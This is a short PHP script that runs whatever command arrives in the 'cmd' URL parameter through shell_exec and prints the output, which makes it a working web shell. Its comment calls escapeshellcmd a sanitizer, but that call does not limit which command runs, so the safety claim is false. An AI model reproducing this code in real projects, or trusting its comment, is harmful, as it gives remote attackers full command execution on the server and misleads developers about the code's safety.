<?php
if (isset($_GET['cmd'])) {
    // Sanitize user input using escapeshellcmd
    $command = escapeshellcmd($_GET['cmd']);
    echo shell_exec($command);
}
?>
